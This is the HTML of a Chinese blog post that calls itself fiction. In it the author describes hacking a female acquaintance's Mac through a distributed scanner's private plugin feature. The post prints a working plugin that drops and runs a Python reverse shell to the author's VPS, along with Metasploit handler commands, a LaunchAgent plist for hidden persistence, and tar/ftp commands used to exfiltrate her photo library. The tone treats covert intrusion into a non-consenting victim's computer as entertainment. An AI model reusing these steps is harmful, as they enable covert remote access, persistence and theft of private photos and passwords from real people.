@@ -1,0 +1,876 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1"/>
+
+
+    <meta name="description" content="不是路人甲的闲人丁,娱乐型选手" />
+
+
+
+  <meta name="keywords" content="bugscan,hack," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
+
+
+<meta name="description" content="写在前面最近因为在忙论文的事情，一直没时间去写博客，《PoC 编写指南》也停更了几个月的样子。今天交了初稿，松了口气，抽时间更新一下博客。文章是去年圣诞节写的，由于各种原因，一直没发。重点是思路。
+2015 年 8 月圈子沙龙提的一个想法，之后因为各种事情一直没把这个想法实现出来。其实我感觉文章水分有点大(我就这么随口说说，别当真)。
+本故事纯属虚构，看看就好，不管你信不信，我反正信了。
+事情大概">
+<meta property="og:type" content="article">
+<meta property="og:title" content="进入妹子电脑偷照片和密码实录">
+<meta property="og:url" content="http://blog.evalbug.com/2016/04/12/funny_things_152/index.html">
+<meta property="og:site_name" content="Medici.Yan's Blog">
+<meta property="og:description" content="写在前面最近因为在忙论文的事情，一直没时间去写博客，《PoC 编写指南》也停更了几个月的样子。今天交了初稿，松了口气，抽时间更新一下博客。文章是去年圣诞节写的，由于各种原因，一直没发。重点是思路。
+2015 年 8 月圈子沙龙提的一个想法，之后因为各种事情一直没把这个想法实现出来。其实我感觉文章水分有点大(我就这么随口说说，别当真)。
+本故事纯属虚构，看看就好，不管你信不信，我反正信了。
+事情大概">
+<meta property="og:image" content="http://blog.evalbug.com/images/152/152_msf_options.png">
+<meta property="og:image" content="http://blog.evalbug.com/images/152/152_wechat.png">
+<meta property="og:image" content="http://blog.evalbug.com/images/152/152_msf_getconn.png">
+<meta property="og:image" content="http://blog.evalbug.com/images/152/152_msf_shell_launchctl.png">
+<meta property="og:image" content="http://blog.evalbug.com/images/152/152_bugscan_two_nodes.png">
+<meta property="og:image" content="http://blog.evalbug.com/images/152/152_pic_dir.png">
+<meta property="og:image" content="http://blog.evalbug.com/images/152/152_pic_list.png">
+<meta property="og:image" content="http://blog.evalbug.com/images/152/152_keychain_dir.png">
+<meta property="og:image" content="http://blog.evalbug.com/images/152/152_keychain_list.png">
+<meta property="og:image" content="http://blog.evalbug.com/images/152/152_keychain_github_pass.png">
+<meta property="og:image" content="http://blog.evalbug.com/images/152/152_keychain_github.png">
+<meta property="og:image" content="http://blog.evalbug.com/images/152/152_nonono.png">
+<meta property="og:updated_time" content="2016-04-12T15:58:30.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="进入妹子电脑偷照片和密码实录">
+<meta name="twitter:description" content="写在前面最近因为在忙论文的事情，一直没时间去写博客，《PoC 编写指南》也停更了几个月的样子。今天交了初稿，松了口气，抽时间更新一下博客。文章是去年圣诞节写的，由于各种原因，一直没发。重点是思路。
+2015 年 8 月圈子沙龙提的一个想法，之后因为各种事情一直没把这个想法实现出来。其实我感觉文章水分有点大(我就这么随口说说，别当真)。
+本故事纯属虚构，看看就好，不管你信不信，我反正信了。
+事情大概">
+<meta name="twitter:image" content="http://blog.evalbug.com/images/152/152_msf_options.png">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: 'post'
+  };
+</script>
+
+  <title> 进入妹子电脑偷照片和密码实录 | Medici.Yan's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?35fe43c56e8a4a68a6a2ae899b9028fb";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+  <script>
+    (function(){
+        var bp = document.createElement('script');
+        bp.src = '//push.zhanzhang.baidu.com/push.js';
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-next-logo"></i>
+      </span>
+      <span class="site-title">Medici.Yan's Blog</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu menu-left">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-next-home"></i> <br />
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            <i class="menu-item-icon icon-next-about"></i> <br />
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-next-tags"></i> <br />
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            <i class="menu-item-icon icon-next-categories"></i> <br />
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-next-archives"></i> <br />
+            归档
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <form class="site-search-form" >
+  <input type="text" id="ts-search-input" class="menu-search-input">
+</form>
+<script>
+  var option = {
+    engineKey: 'c9b47bfaa23404adf331'
+  };
+  (function(w,d,t,u,n,s,e){
+    s = d.createElement(t);
+    s.src = u;
+    s.async = 1;
+    w[n] = function(r){
+      w[n].opts = r;
+    };
+    e = d.getElementsByTagName(t)[0];
+    e.parentNode.insertBefore(s, e);
+  })(window,document,'script','//tinysou-cdn.b0.upaiyun.com/ts.js','_ts');
+  _ts(option);
+</script>
+
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              进入妹子电脑偷照片和密码实录
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2016-04-12T11:41:48+08:00" content="2016-04-12">
+            2016-04-12
+          </time>
+        </span>
+
+        
+          <span class="post-category" >
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/bugscan/" itemprop="url" rel="index">
+                  <span itemprop="name">bugscan</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2016/04/12/funny_things_152/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2016/04/12/funny_things_152/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近因为在忙论文的事情，一直没时间去写博客，《PoC 编写指南》也停更了几个月的样子。今天交了初稿，松了口气，抽时间更新一下博客。文章是去年圣诞节写的，由于各种原因，一直没发。<strong>重点是思路</strong>。</p>
+<p>2015 年 8 月圈子沙龙提的一个想法，之后因为各种事情一直没把这个想法实现出来。其实我感觉文章水分有点大(我就这么随口说说，别当真)。</p>
+<p><strong>本故事纯属虚构，看看就好，不管你信不信，我反正信了。</strong></p>
+<p>事情大概就是这样的，妹子是某公司的研发攻程狮，某天问我渗透网站是不是要先用扫描器？我想了想，还是回答了一个是。接着人又问我什么扫描器好使。</p>
+<p>她要是知道后面电脑会被我黑了，所有密码沦陷了，估计她再也不想问我什么东西了吧。<br><a id="more"></a></p>
+<blockquote>
+<p>“呐，我给你说啊”，我装作我是长者的样子，“扫描器本质上是代替了你手工检测这个过程，来我先给你说说 X-Scan, Nmap, AWVS…”</p>
+<p>“别扯没用的，你直接告诉我你用的哪个。”</p>
+<p>“Bugscan。”</p>
+<p>“为啥用这个什么什么scan？”</p>
+<p>“Bugscan。”</p>
+<p>“对对对，为啥要用这个 Bugscan?”</p>
+<p>“好用”</p>
+<p>“……”</p>
+</blockquote>
+<p>我想她内心是崩溃的。</p>
+<blockquote>
+<p>“那你借你的账号给我用用，我看看这个好用不？”</p>
+<p>“呐，我给你讲啊，我这个账号可是核心账号啊，那家伙，呵，这装起逼来，那可是杠杠的,一装一个满分啊……”</p>
+<p>“给我用用呗。”</p>
+<p>“那是用我的社交账号登的啊！”</p>
+<p>“借不借？不借友尽了啊。”</p>
+<p>“借借借…”</p>
+</blockquote>
+<p>反正就是这样，我把我的账号就这么借她了。笑话，这么危胁我，我能忍？我可是共产主义接班人呐。</p>
+<h2 id="第一天-怎么让节点不挂断"><a href="#第一天-怎么让节点不挂断" class="headerlink" title="第一天 怎么让节点不挂断"></a>第一天 怎么让节点不挂断</h2><p>教了她怎么用，怎么挂节点，怎么扫描。然后她会用了，可是又来问我为什么节点老是会在终端退出之后就掉了。我说啊，是因为一旦会话终止，该会话期的所有相关的进程都会被杀死,包括后台进程。解决的办法呢，就是使用 <code>nohup</code> 或者是 <code>screen</code>。</p>
+<p>具体可以参考我之前的博客的某博文 <a href="http://www.cnblogs.com/mediciyan/p/4307253.html" target="_blank" rel="external">解决Linux关闭SSH，终端后运行程序终止问题(包括后台)</a></p>
+<p>这个博客已经废弃了，不过有一些水文还是能看。</p>
+<p>安装的办法呢</p>
+<p>Ubuntu, Debian: <code>apt-get install nohup</code></p>
+<p>Centos: <code>yum install nohup</code></p>
+<p>OS X : <code>brew install nohup</code></p>
+<p>nohup 命令会忽略 SIGTTIN 信号，从而可以在会话结束之后还可以继续运行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup python -c &quot;exec(__import__(&apos;urllib2&apos;).urlopen(&apos;https://www.bugscan.net/xxxx&apos;).read())&quot; -m 5 &amp;</span><br></pre></td></tr></table></figure>
+<p>但是如果你想在下次登录之后看看命令执行的一些结果，比如你跑了 nmap，想看扫描结果，这时我就推荐你使用 screen 而不是 nohup 了。</p>
+<ol>
+<li><p>新建一个子界面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>进入子界面后，输入构建节点的指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(__import__(&apos;urllib2&apos;).urlopen(&apos;https://www.bugscan.net/xxxx&apos;).read())&quot; -m 5</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>按 ctrl + a ,d 暂停子界面。这时会显示[detached]，并且回到父界面。</p>
+</li>
+<li>想干啥干啥去</li>
+<li><p>查看子界面状态</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -ls</span><br></pre></td></tr></table></figure>
+<p>然后会显示:<br>There is a screen on: 447.pts-1.free (Detached)<br>这里的447就是子界面的进程号。</p>
+</li>
+<li><p>恢复进入子界面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -r 447</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在子界面杀死子界面的办法是先ctrl + a ,然后按k。</p>
+</li>
+</ol>
+<h2 id="第二天-原理"><a href="#第二天-原理" class="headerlink" title="第二天 原理"></a>第二天 原理</h2><p>这天闲着没事，我就上 Bugscan 溜达溜达，你猜怎么着，那家伙开了 screen 之后忘记退了，忘记退了，忘记退了。怎么办怎么办怎么我都知道了她的 IP 地址了，卧槽卧槽卧槽，好想干点坏事，忍不住想干点坏事啊。</p>
+<blockquote>
+<p>经过了痛苦的纠结之后，师父，徒儿还是没能压制住体内的洪荒之力</p>
+</blockquote>
+<p>大概讲一下这个时候的状态:</p>
+<blockquote>
+<p>妹子用她自己的电脑挂了一个节点来扫描，然后她用了我的 Bugscan 账号。现在我登录了 Bugscan 之后，在节点列表是可以看到她的。</p>
+</blockquote>
+<p><strong>在讲后面操作之前，我得再多说一下，Bugscan 的一些原理：</strong></p>
+<p>一般来说，你用 nmap，就是在本地安装一个 nmap, 然后让 nmap 来发包去扫描，那么作为我们扫描方来说，每一台机器都要安装 nmap 之后才能扫描。</p>
+<p>好，不要急，再说一下在线扫描器，它是用一个 web 来接收你传过来的 url , 然后自己服务器去扫描，再把扫描结果结你。这里就会出一些个问题：</p>
+<ul>
+<li>同一时间提交扫描任务的用户数特别多，那么服务器资源就很吃紧</li>
+<li>由于是服务器代替用户扫描，如果目标不可达(比如内网)，就没办法扫</li>
+<li>总有一些没死过的人用这个来扫 gov edu 的站，这样一旦出个事，锅是让你来背的，因为扫描的人是你，而不是人家。</li>
+</ul>
+<p>回到正题，Bugscan 就是这样，你看到的 Bugscan.net 其实就是一个任务控制端，真正扫描的，其实就是你的节点。你在网页上提交了一个扫描任务之后，服务器会把这个任务分发给你指定的节点，然后节点和插件池同步，拉取新的插件(这里用插件的 hash 比对，防止重复拉取浪费流量，也提高了速度)，然后让节点加载核心插件识别指纹，接着根据指纹加载其对应的这些扫描插件，向目标发包，有结果了就给服务器报告。</p>
+<p>整个过程，你可以理解成，你手动把你想要的的插件保存到了你的本地，然后一个个执行了一次。然后把结果汇总了一下。</p>
+<blockquote>
+<p>我把真相这么说出来会不会被西瓜皮打死在华山顶？<br>其实我说的只是一部分，注意看我上面的措辞，一些，可能，应该，可以…好了再说我就被打死了。</p>
+</blockquote>
+<p>我的第一次猜想是服务端把插件加载后的请求转发给节点了，但是这样做服务端压力实在是太大了，肯定是节点执行插件这种方式。所以呢，这里就是我们的突破点了。</p>
+<p><strong>下载 python 代码到节点，然后执行。</strong></p>
+<p><strong>下载 python 代码到节点，然后执行！</strong></p>
+<p><strong>下载 python 代码到节点，然后执行！！</strong></p>
+<h2 id="第三天-初步渗透"><a href="#第三天-初步渗透" class="headerlink" title="第三天 初步渗透"></a>第三天 初步渗透</h2><h3 id="制作后门"><a href="#制作后门" class="headerlink" title="制作后门"></a>制作后门</h3><p>我还是给翻译翻译吧，下载 python 后门代码到<strong>妹子的电脑</strong>，然后执行。</p>
+<p>Bugscan 的每个插件都要人工审核的，想批量搞别人是不可能的，但是呢，我的账号是核心账号啊，我都说了这账号装起逼来可是杠杠的啊。我有私有插件啊。</p>
+<blockquote>
+<p>私有插件就是这个插件只能给你自己用，而且不用审核就能直接在扫描的时候加载</p>
+</blockquote>
+<p>于是果断上传私有插件(没错我4个月前就已经写了 Demo 了): <a href="http://q.bugscan.net/t/1018" target="_blank" rel="external">Whoknows</a></p>
+<p>我先贴源码，然后讲：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># __author__ = &apos;Medici.Yan&apos;</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import commands</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def assign(service, arg):</span><br><span class="line">    if service == &quot;ip&quot;:</span><br><span class="line">        return True, arg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def audit(arg):</span><br><span class="line">    whoknowns()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def whoknowns():</span><br><span class="line">    root_dir_p = &quot;/tmp&quot;</span><br><span class="line">    py_payload = &apos;&apos;&apos;#!/usr/bin/env python</span><br><span class="line"># coding:utf-8</span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">s = socket.socket(2, socket.SOCK_STREAM)</span><br><span class="line">try:</span><br><span class="line">    s.connect((&apos;108.61.xxx.xxx&apos;, 8080))</span><br><span class="line">    l = struct.unpack(&apos;&gt;I&apos;, s.recv(4))[0]</span><br><span class="line">    d = s.recv(l)</span><br><span class="line">    while len(d) &lt; l:</span><br><span class="line">        d += s.recv(l - len(d))</span><br><span class="line">    exec(d, &#123;&apos;s&apos;: s&#125;)</span><br><span class="line">except Exception, e:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">    msf_path = &apos;%s/msf.py&apos; % root_dir_p</span><br><span class="line">    open(msf_path, &apos;w&apos;).write(py_payload)</span><br><span class="line">    commands.getstatusoutput(&apos;python %s&apos; % msf_path)</span><br><span class="line">    if os.path.isfile(msf_path):</span><br><span class="line">        os.remove(&apos;%s&apos; % msf_path)</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    from dummy import *</span><br><span class="line">    audit(assign(&apos;www&apos;, &apos;http://www.example.com/&apos;)[1])</span><br></pre></td></tr></table></figure>
+<p>这段代码就是向 /tmp 目录写入一个 msf.py 的文件，msf.py 是一个 msf 的 python 反向后门，然后调用系统命令执行这个 msf.py，完事之后还会自己删除这个 msf.py 文件。</p>
+<p>108.61.xxx.xxx 是我的 vps 的地址，8080 是我将来 msf 要监听的端口。 assign, audit 都是 Bugscan 的入口，whoknows 才是我的代码，为什么叫这个名字呢，其实是有深意的，意思就是……我当时就是这么想的，你管我。</p>
+<p>然后把这段后门代码以私有插件形式传上去。</p>
+<h3 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h3><p>连上 vps , 打开 msfconsole, 然后执行下面的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload python/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost 0.0.0.0</span><br><span class="line">msf exploit(handler) &gt; set lport 8080</span><br><span class="line">msf exploit(handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p><img src="/images/152/152_msf_options.png" alt=""></p>
+<p>上面的操作就是监听后门连接，上面后门插件中写到妹子电脑中的 msf.py 内容其实就是 用这里的 payload 生成的后门代码，为什么要用 8080 端口？80 和 8080 这种端口，她看了肯定不会怀疑是后门的。</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>准备工作完成之后，不能着急直接去搞，为什么？</p>
+<p><strong>不能打草惊妹子啊。</strong></p>
+<p>妹子的电脑是 Macbook, 还好不是 windows, 我还特意在微信上<strong>假装关心地</strong>问了她有没有装电脑管家或者是卫士什么的安全软件。得到的结果就是没装，要是装了这些个产品，我还得想想怎么免杀的问题。</p>
+<p><img src="/images/152/152_wechat.png" alt=""></p>
+<p>如果不小心，直接点了执行，后门被拦下来不说，妹子也会立马发现，发现不了根源，也会重启啊，一重启，连 IP 都不知道了还怎么搞。所以一定不能急于求成。</p>
+<p>现在知道是裸奔的电脑了，那我就放心了，Go!</p>
+<h3 id="Go-Go-Go"><a href="#Go-Go-Go" class="headerlink" title="Go!Go!Go!"></a>Go!Go!Go!</h3><p>打开 Bugscan.net，新建一个扫描任务。</p>
+<p><img src="/images/152/152_msf_getconn.png" alt=""></p>
+<p>可以看到，我们的后门代码执行了，并且反弹过来了一个 meterpreter。有了 meterpreter, 其实后面的操作大家都就熟悉了。然而我第一件事并不是干坏事。</p>
+<h3 id="巩固后门"><a href="#巩固后门" class="headerlink" title="巩固后门"></a>巩固后门</h3><p>因为目标是妹子的个人电脑，不比服务器，她现在在做什么我完全不知道，说不定在我打字的这个时间，她正打算关机睡觉呢？人要是一睡觉，下次再联网，后门就掉了啊，所以，我的第一件事，就是巩固后门。</p>
+<p>msf 的后门应该是最理想的，但是呢，妹子的电脑是常年处在内网当中的，她去公司，在公司的路由下，回家里，是在家里的内网下，如果用 metsvc 来持久化后门的话，在这种情况下根本没什么用好吗？</p>
+<p>写个 msf.py 到启动项里面？</p>
+<p>她要是开机的时候，我的 msf 没在监听，然后人家一个星期不关机，我不就是傻逼了？</p>
+<p>我的办法是写了一个自动构建 Bugscan 节点的脚本，在 Linux 下的话，可以用 corntab 来做，但是 Mac OS X 内置的一种称为 Launch Daemon/Agent 的机制来实现系统启动时自动执行脚本程序。我们就可以令脚本程序在系统启动的时候在后台运行了。 具体来参考我这篇博文 <a href="http://blog.evalbug.com/2015/11/29/osx_plist_startup/">Mac OS X 开机启动脚本(自动构建 Bugscan 节点)</a></p>
+<p>我写了一个 bugscan.plist：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;</span><br><span class="line">&lt;plist version=&quot;1.0&quot;&gt;</span><br><span class="line">&lt;dict&gt;</span><br><span class="line">    &lt;key&gt;Label&lt;/key&gt;</span><br><span class="line">        &lt;string&gt;com.bugscan.net&lt;/string&gt;</span><br><span class="line">    &lt;key&gt;ProgramArguments&lt;/key&gt;</span><br><span class="line">    &lt;array&gt;</span><br><span class="line">        &lt;string&gt;python&lt;/string&gt;</span><br><span class="line">        &lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">        &lt;string&gt;exec(__import__(&apos;urllib2&apos;).urlopen(&apos;https://www.bugscan.net/这里是你自己的用户标识&apos;).read())&lt;/string&gt;</span><br><span class="line">        &lt;string&gt;-m&lt;/string&gt;</span><br><span class="line">        &lt;string&gt;5&lt;/string&gt;</span><br><span class="line">    &lt;/array&gt;</span><br><span class="line">    &lt;key&gt;RunAtLoad&lt;/key&gt;</span><br><span class="line">        &lt;true/&gt;</span><br><span class="line">    &lt;key&gt;StartCalendarInterval&lt;/key&gt;</span><br><span class="line">    &lt;dict&gt;</span><br><span class="line">        &lt;key&gt;Minute&lt;/key&gt;</span><br><span class="line">        &lt;integer&gt;20&lt;/integer&gt;</span><br><span class="line">    &lt;/dict&gt;</span><br><span class="line">&lt;/dict&gt;</span><br><span class="line">&lt;/plist&gt;</span><br></pre></td></tr></table></figure>
+<p>上面配置中的 20 就是说每个小时的 20 分的时候会检查有没有执行这个脚本，如果没有就执行一次。然后把这个 plist 文件传到 vps 上，开个 http 服务，在 meterpreter 里面打开一个 shell, 直接 wget 下载到妹子的 ~/Library/LaunchAgents/ 目录下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/Library/LaunchAgents/</span><br><span class="line">wget http://xxx.xxx.xxx.xxx/bugscan.plist</span><br></pre></td></tr></table></figure>
+<p>因为她运行的时候不是以 root 运行的，所以我没权限给系统目录写，如果是 root 的话，可以直接向系统目录中写</p>
+<p>然后让配置生效：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">launchctl load ~/Library/LaunchAgents/bugscan.plist</span><br></pre></td></tr></table></figure>
+<p><img src="/images/152/152_msf_shell_launchctl.png" alt=""></p>
+<p>运行之后，发现妹子的 IP 在我的节点列表里面出现了两个，哈哈哈，成功了。之前那个是她没关的，现在这个就是 plist 启动的。</p>
+<p><img src="/images/152/152_bugscan_two_nodes.png" alt=""></p>
+<p>这下心里塌实多了，你关了电脑明天我还能继续搞。不怕你换网络啦。</p>
+<p>为什么要这样呢？系统偏好设置 里面的 用户与群组可以查看登陆的启动项，这个方法不会在启动项里面看到，当然就无从查觉了。</p>
+<h2 id="第四天-羞羞的事情"><a href="#第四天-羞羞的事情" class="headerlink" title="第四天 羞羞的事情"></a>第四天 羞羞的事情</h2><p>后门也留好了，事实上，到现在这个后门还是留着的，没被发现。</p>
+<p>那下一步要做什么呢？</p>
+<p>我想想啊。。。</p>
+<h3 id="偷看妹子皂片"><a href="#偷看妹子皂片" class="headerlink" title="偷看妹子皂片"></a>偷看妹子皂片</h3><p>这里不得不说一下 Apple 的贴心之处，一个 iCloud 账号，设备之间的信息都可以互相同步。</p>
+<p>你在其它设备上拍摄的照片，如果开了共享，就会同步一份，在 Mac 上的位置就是用户家目录下的 Picture 目录下的 照片图库.photoslibrary:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Users/medicean/Pictures/照片图库.photoslibrary</span><br></pre></td></tr></table></figure>
+<p>哟西，不说了，直接使用 meterpreter 的 download 命令，把它下载到 vps 上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; download /Users/meizi/Pictures/照片图库.photoslibrary /root</span><br></pre></td></tr></table></figure>
+<p>乱码了居然！！我靠！</p>
+<p>那我直接把你整个 Pictures 目录下载了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; download -r /Users/meizi/Pictures /root</span><br></pre></td></tr></table></figure>
+<p>这下执行没事了，但是！！！！这个东西太大了，下到 1/3 的时候，meterpreter 会出错结果给了我一个不完整的库，这真是气死宝宝了。</p>
+<p>机智的我总会对这些自认为能力出众的问题出手。</p>
+<p>前往 vps ，开了一个 ftp 服务，嗯，开了一个 ftp 服务。然后进 meterpreter 的 shell, 把照片打包后使用 ftp 上传到我的服务器。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tar cf meizipic.tar /Users/meizi/Pictures</span><br><span class="line"></span><br><span class="line">ftp xxx.xxx.xxx.xxx</span><br><span class="line"></span><br><span class="line">##</span><br><span class="line">// 然后这里是让你输入 ftp 的账号密码</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">put meizipic.tar /</span><br></pre></td></tr></table></figure>
+<p>这里如果你想上传她电脑上的文件，都是可以的，但是，我这么有操守的人，是不可能做出这种事情的，万一人电脑上有机密文件，我一不小心知道了，这就成了窃取公司机密了，我可是共产主义事业接班人，怎么能做这种事，坚决不做。</p>
+<p>于是我就把妹子的 photoslibrary 下载到本地了，然后用我的本本打开。</p>
+<p><img src="/images/152/152_pic_dir.png" alt=""></p>
+<p>嘻嘻嘻嘻, 打开看看…</p>
